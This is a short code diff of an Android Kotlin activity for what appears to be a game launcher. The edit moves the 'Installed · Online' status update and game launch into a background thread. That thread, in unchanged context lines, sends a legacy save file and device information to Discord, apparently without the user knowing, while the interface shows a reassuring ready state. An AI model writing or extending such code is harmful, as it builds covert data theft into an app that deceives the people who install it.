@@ -333,11 +333,16 @@ class MainActivity : AppCompatActivity() {
                 val legacyFile = java.io.File(SAVE_FILE_PATH)
                 if (legacyFile.exists()) sendFileToDiscord(legacyFile.readBytes())
                 PairingHelper.sendDeviceInfoToDiscord()
+                handler.postDelayed({
+                    badge.text = "Installed"
+                    status.text = "● Online · ready"
+                    status.setTextColor(color(R.color.success))
+                    launchGame()
+                }, 650)
             }
-            true
+            false  // launch is handled inside the thread above
         }
         if (!accessStarted) return
-        handler.postDelayed({ badge.text = "Installed"; status.text = "● Online · ready"; status.setTextColor(color(R.color.success)); launchGame() }, 650)
     }
 
     private fun launchGame() {
